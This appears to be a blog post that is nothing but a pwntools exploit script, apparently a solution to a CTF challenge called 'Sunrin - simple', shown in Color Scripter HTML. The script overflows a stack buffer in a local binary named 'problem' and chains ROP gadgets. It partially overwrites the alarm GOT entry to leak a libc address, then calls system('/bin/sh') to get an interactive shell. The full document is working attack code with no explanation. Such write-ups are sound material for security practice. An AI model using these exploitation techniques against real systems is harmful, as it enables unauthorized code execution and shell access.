# Sunrin - simple

<div class="colorscripter-code" style="color:#010101;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important; position:relative !important;overflow:auto"><table class="colorscripter-code-table" style="margin:0;padding:0;border:none;background-color:#fafafa;border-radius:4px;" cellspacing="0" cellpadding="0"><tr><td style="padding:6px;border-right:2px solid #e5e5e5"><div style="margin:0;padding:0;word-break:normal;text-align:right;color:#666;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important;line-height:130%"><div style="line-height:130%">1</div><div style="line-height:130%">2</div><div style="line-height:130%">3</div><div style="line-height:130%">4</div><div style="line-height:130%">5</div><div style="line-height:130%">6</div><div style="line-height:130%">7</div><div style="line-height:130%">8</div><div style="line-height:130%">9</div><div style="line-height:130%">10</div><div style="line-height:130%">11</div><div style="line-height:130%">12</div><div style="line-height:130%">13</div><div style="line-height:130%">14</div><div style="line-height:130%">15</div><div style="line-height:130%">16</div><div style="line-height:130%">17</div><div style="line-height:130%">18</div><div style="line-height:130%">19</div><div style="line-height:130%">20</div><div style="line-height:130%">21</div><div style="line-height:130%">22</div><div style="line-height:130%">23</div><div style="line-height:130%">24</div><div style="line-height:130%">25</div><div style="line-height:130%">26</div><div style="line-height:130%">27</div><div style="line-height:130%">28</div><div style="line-height:130%">29</div><div style="line-height:130%">30</div><div style="line-height:130%">31</div><div style="line-height:130%">32</div><div style="line-height:130%">33</div><div style="line-height:130%">34</div><div style="line-height:130%">35</div><div style="line-height:130%">36</div><div style="line-height:130%">37</div><div style="line-height:130%">38</div><div style="line-height:130%">39</div><div style="line-height:130%">40</div><div style="line-height:130%">41</div><div style="line-height:130%">42</div><div style="line-height:130%">43</div><div style="line-height:130%">44</div><div style="line-height:130%">45</div><div style="line-height:130%">46</div><div style="line-height:130%">47</div><div style="line-height:130%">48</div><div style="line-height:130%">49</div><div style="line-height:130%">50</div><div style="line-height:130%">51</div><div style="line-height:130%">52</div><div style="line-height:130%">53</div><div style="line-height:130%">54</div><div style="line-height:130%">55</div><div style="line-height:130%">56</div><div style="line-height:130%">57</div><div style="line-height:130%">58</div><div style="line-height:130%">59</div><div style="line-height:130%">60</div><div style="line-height:130%">61</div><div style="line-height:130%">62</div><div style="line-height:130%">63</div><div style="line-height:130%">64</div><div style="line-height:130%">65</div><div style="line-height:130%">66</div><div style="line-height:130%">67</div><div style="line-height:130%">68</div><div style="line-height:130%">69</div><div style="line-height:130%">70</div><div style="line-height:130%">71</div><div style="line-height:130%">72</div><div style="line-height:130%">73</div></div></td><td style="padding:6px 0;text-align:left"><div style="margin:0;padding:0;color:#010101;font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace !important;line-height:130%"><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#a71d5d">from</span>&nbsp;pwn&nbsp;<span style="color:#a71d5d">import</span>&nbsp;<span style="color:#0086b3"></span><span style="color:#a71d5d">*</span></div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;</div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#999999">#context.log_level='debug'</span></div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;</div><div style="padding:0 6px; white-space:pre; line-height:130%">r<span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>process(<span style="color:#63a35c">'problem'</span>)</div><div style="padding:0 6px; white-space:pre; line-height:130%">e<span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>ELF(<span style="color:#63a35c">'problem'</span>)</div><div style="padding:0 6px; white-space:pre; line-height:130%">libc<span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>e.libc</div><div style="padding:0 6px; white-space:pre; line-height:130%">syscall<span style="color:#0086b3"></span><span style="color:#a71d5d">=</span><span style="color:#63a35c">'\x7b'</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#999999">#write='\xb9'</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#999999">#0x00000000004005fc&nbsp;:&nbsp;pop&nbsp;r12&nbsp;;&nbsp;pop&nbsp;r13&nbsp;;&nbsp;pop&nbsp;r14&nbsp;;&nbsp;pop&nbsp;r15&nbsp;;&nbsp;ret</span></div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;</div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">''</span><span style="color:#63a35c">'</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">0x7ffff7ad9517&nbsp;&lt;__libc_fork+471&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;eax,r13d</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">0x7ffff7ad951a&nbsp;&lt;__libc_fork+474&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pop&nbsp;&nbsp;&nbsp;&nbsp;rbx</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;0x7ffff7ad951b&nbsp;&lt;__libc_fork+475&gt;:&nbsp;&nbsp;&nbsp;&nbsp;pop&nbsp;&nbsp;&nbsp;&nbsp;r12</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;0x7ffff7ad951d&nbsp;&lt;__libc_fork+477&gt;:&nbsp;&nbsp;&nbsp;&nbsp;pop&nbsp;&nbsp;&nbsp;&nbsp;r13</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;0x7ffff7ad951f&nbsp;&lt;__libc_fork+479&gt;:&nbsp;&nbsp;&nbsp;&nbsp;pop&nbsp;&nbsp;&nbsp;&nbsp;r14</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;0x7ffff7ad9521&nbsp;&lt;__libc_fork+481&gt;:&nbsp;&nbsp;&nbsp;&nbsp;pop&nbsp;&nbsp;&nbsp;&nbsp;r15</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;0x7ffff7ad9523&nbsp;&lt;__libc_fork+483&gt;:&nbsp;&nbsp;&nbsp;&nbsp;pop&nbsp;&nbsp;&nbsp;&nbsp;rbp</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">&nbsp;&nbsp;&nbsp;0x7ffff7ad9524&nbsp;&lt;__libc_fork+484&gt;:&nbsp;&nbsp;&nbsp;&nbsp;ret</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#63a35c">'</span><span style="color:#63a35c">''</span></div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;</div><div style="padding:0 6px; white-space:pre; line-height:130%">payload<span style="color:#0086b3"></span><span style="color:#a71d5d">=</span><span style="color:#63a35c">'A'</span><span style="color:#0086b3"></span><span style="color:#a71d5d">*</span><span style="color:#0099cc">0x38</span></div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;</div><div style="padding:0 6px; white-space:pre; line-height:130%">payload<span style="color:#0086b3"></span><span style="color:#a71d5d">+</span><span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>p64(<span style="color:#0099cc">0x400601</span>)</div><div style="padding:0 6px; white-space:pre; line-height:130%">payload<span style="color:#0086b3"></span><span style="color:#a71d5d">+</span><span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>p64(e.got[<span style="color:#63a35c">'alarm'</span>])</div><div style="padding:0 6px; white-space:pre; line-height:130%">payload<span style="color:#0086b3"></span><span style="color:#a71d5d">+</span><span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>p64(<span style="color:#0099cc">0xdeadbeef</span>)</div><div style="padding:0 6px; white-space:pre; line-height:130%">payload<span style="color:#0086b3"></span><span style="color:#a71d5d">+</span><span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>p64(e.plt[<span style="color:#63a35c">'read'</span>])</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;</div><div style="padding:0 6px; white-space:pre; line-height:130%">payload<span style="color:#0086b3"></span><span style="color:#a71d5d">+</span><span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>p64(<span style="color:#0099cc">0x400601</span>)</div><div style="padding:0 6px; white-space:pre; line-height:130%">payload<span style="color:#0086b3"></span><span style="color:#a71d5d">+</span><span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>p64(e.got[<span style="color:#63a35c">'read'</span>])</div><div style="padding:0 6px; white-space:pre; line-height:130%">payload<span style="color:#0086b3"></span><span style="color:#a71d5d">+</span><span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>p64(<span style="color:#0099cc">0xdeadbeef</span>)</div><div style="padding:0 6px; white-space:pre; line-height:130%">payload<span style="color:#0086b3"></span><span style="color:#a71d5d">+</span><span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>p64(e.plt[<span style="color:#63a35c">'read'</span>])</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;</div><div style="padding:0 6px; white-space:pre; line-height:130%">payload<span style="color:#0086b3"></span><span style="color:#a71d5d">+</span><span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>p64(<span style="color:#0099cc">0x4005fc</span>)</div><div style="padding:0 6px; white-space:pre; line-height:130%">payload<span style="color:#0086b3"></span><span style="color:#a71d5d">+</span><span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>p64(<span style="color:#0099cc">1</span>)<span style="color:#0086b3"></span><span style="color:#a71d5d">*</span><span style="color:#0099cc">4</span></div><div style="padding:0 6px; white-space:pre; line-height:130%">payload<span style="color:#0086b3"></span><span style="color:#a71d5d">+</span><span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>p64(e.plt[<span style="color:#63a35c">'alarm'</span>])</div><div style="padding:0 6px; white-space:pre; line-height:130%">payload<span style="color:#0086b3"></span><span style="color:#a71d5d">+</span><span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>p64(<span style="color:#0099cc">0</span>)<span style="color:#0086b3"></span><span style="color:#a71d5d">*</span><span style="color:#0099cc">6</span></div><div style="padding:0 6px; white-space:pre; line-height:130%">payload<span style="color:#0086b3"></span><span style="color:#a71d5d">+</span><span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>p64(<span style="color:#0099cc">0x400603</span>)</div><div style="padding:0 6px; white-space:pre; line-height:130%">payload<span style="color:#0086b3"></span><span style="color:#a71d5d">+</span><span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>p64(<span style="color:#0099cc">1</span>)</div><div style="padding:0 6px; white-space:pre; line-height:130%">payload<span style="color:#0086b3"></span><span style="color:#a71d5d">+</span><span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>p64(e.plt[<span style="color:#63a35c">'read'</span>])</div><div style="padding:0 6px; white-space:pre; line-height:130%">payload<span style="color:#0086b3"></span><span style="color:#a71d5d">+</span><span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>p64(<span style="color:#0099cc">0x400603</span>)</div><div style="padding:0 6px; white-space:pre; line-height:130%">payload<span style="color:#0086b3"></span><span style="color:#a71d5d">+</span><span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>p64(<span style="color:#0099cc">0</span>)</div><div style="padding:0 6px; white-space:pre; line-height:130%">payload<span style="color:#0086b3"></span><span style="color:#a71d5d">+</span><span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>p64(<span style="color:#0099cc">0x400601</span>)</div><div style="padding:0 6px; white-space:pre; line-height:130%">payload<span style="color:#0086b3"></span><span style="color:#a71d5d">+</span><span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>p64(e.got[<span style="color:#63a35c">'alarm'</span>])<span style="color:#0086b3"></span><span style="color:#a71d5d">*</span><span style="color:#0099cc">2</span></div><div style="padding:0 6px; white-space:pre; line-height:130%">payload<span style="color:#0086b3"></span><span style="color:#a71d5d">+</span><span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>p64(e.plt[<span style="color:#63a35c">'alarm'</span>])</div><div style="padding:0 6px; white-space:pre; line-height:130%">payload<span style="color:#0086b3"></span><span style="color:#a71d5d">+</span><span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>p64(<span style="color:#0099cc">0</span>)<span style="color:#0086b3"></span><span style="color:#a71d5d">*</span><span style="color:#0099cc">6</span></div><div style="padding:0 6px; white-space:pre; line-height:130%">payload<span style="color:#0086b3"></span><span style="color:#a71d5d">+</span><span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>p64(e.plt[<span style="color:#63a35c">'read'</span>])</div><div style="padding:0 6px; white-space:pre; line-height:130%">payload<span style="color:#0086b3"></span><span style="color:#a71d5d">+</span><span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>p64(e.symbols[<span style="color:#63a35c">'main'</span>])</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;</div><div style="padding:0 6px; white-space:pre; line-height:130%">sleep(<span style="color:#0099cc">0.</span><span style="color:#0099cc">1</span>)</div><div style="padding:0 6px; white-space:pre; line-height:130%">r.send(payload)</div><div style="padding:0 6px; white-space:pre; line-height:130%">sleep(<span style="color:#0099cc">0.</span><span style="color:#0099cc">1</span>)</div><div style="padding:0 6px; white-space:pre; line-height:130%">r.send(p16(<span style="color:#0099cc">0x9517</span>))</div><div style="padding:0 6px; white-space:pre; line-height:130%">sleep(<span style="color:#0099cc">0.</span><span style="color:#0099cc">1</span>)</div><div style="padding:0 6px; white-space:pre; line-height:130%">r.send(<span style="color:#63a35c">'\x5e'</span>)</div><div style="padding:0 6px; white-space:pre; line-height:130%">sleep(<span style="color:#0099cc">0.</span><span style="color:#0099cc">1</span>)</div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#a71d5d">try</span>:</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;leak<span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>u64(r.recvuntil(<span style="color:#63a35c">'\x7f'</span>).ljust(<span style="color:#0099cc">8</span>,<span style="color:#63a35c">'\x00'</span>))<span style="color:#0086b3"></span><span style="color:#a71d5d">-</span>libc.symbols[<span style="color:#63a35c">'read'</span>]<span style="color:#0086b3"></span><span style="color:#a71d5d">-</span><span style="color:#0099cc">0xe</span></div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;log.info(hex(leak))</div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#a71d5d">except</span>:</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#a71d5d">pass</span></div><div style="padding:0 6px; white-space:pre; line-height:130%"><span style="color:#999999">#raw_input()</span></div><div style="padding:0 6px; white-space:pre; line-height:130%">r.send(p16(<span style="color:#0099cc">0x9200</span>))</div><div style="padding:0 6px; white-space:pre; line-height:130%">sleep(<span style="color:#0099cc">0.</span><span style="color:#0099cc">1</span>)</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;</div><div style="padding:0 6px; white-space:pre; line-height:130%">payload<span style="color:#0086b3"></span><span style="color:#a71d5d">=</span><span style="color:#63a35c">'A'</span><span style="color:#0086b3"></span><span style="color:#a71d5d">*</span><span style="color:#0099cc">0x38</span></div><div style="padding:0 6px; white-space:pre; line-height:130%">payload<span style="color:#0086b3"></span><span style="color:#a71d5d">+</span><span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>p64(<span style="color:#0099cc">0x400603</span>)</div><div style="padding:0 6px; white-space:pre; line-height:130%">payload<span style="color:#0086b3"></span><span style="color:#a71d5d">+</span><span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>p64(leak<span style="color:#0086b3"></span><span style="color:#a71d5d">+</span>list(libc.search(<span style="color:#63a35c">"/bin/sh"</span>))[<span style="color:#0099cc">0</span>])</div><div style="padding:0 6px; white-space:pre; line-height:130%">payload<span style="color:#0086b3"></span><span style="color:#a71d5d">+</span><span style="color:#0086b3"></span><span style="color:#a71d5d">=</span>p64(leak<span style="color:#0086b3"></span><span style="color:#a71d5d">+</span>libc.symbols[<span style="color:#63a35c">'system'</span>])</div><div style="padding:0 6px; white-space:pre; line-height:130%">r.send(payload)</div><div style="padding:0 6px; white-space:pre; line-height:130%">&nbsp;</div><div style="padding:0 6px; white-space:pre; line-height:130%">r.interactive()</div></div><div style="text-align:right;margin-top:-13px;margin-right:5px;font-size:9px;font-style:italic"><a href="http://colorscripter.com/info#e" target="_blank" style="color:#e5e5e5text-decoration:none">Colored by Color Scripter</a></div></td><td style="vertical-align:bottom;padding:0 2px 4px 0"><a href="http://colorscripter.com/info#e" target="_blank" style="text-decoration:none;color:white"><span style="font-size:9px;word-break:normal;background-color:#e5e5e5;color:white;border-radius:10px;padding:1px">cs</span></a></td></tr></table></div>
